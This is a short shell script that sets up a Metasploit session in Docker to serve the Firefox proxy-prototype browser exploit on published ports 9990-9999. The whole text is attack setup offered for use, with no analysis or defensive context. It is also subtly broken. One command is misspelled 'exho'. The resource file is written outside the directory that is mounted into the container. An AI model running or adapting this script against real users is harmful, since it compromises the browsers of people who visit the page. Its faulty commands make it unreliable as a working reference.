mkdir /tmp/msf
echo use exploit/multi/browser/firefox_proxy_prototype > run.rc
echo set URIPATH exploit >> run.rc
exho exploit >> run.rc

docker rm -f msf && docker run -i -t -p 9990-9999:9990-9999 -v /tmp/msf:/tmp/data --name msf phocean/msf msfconsole -r /tmp/data/run.rc
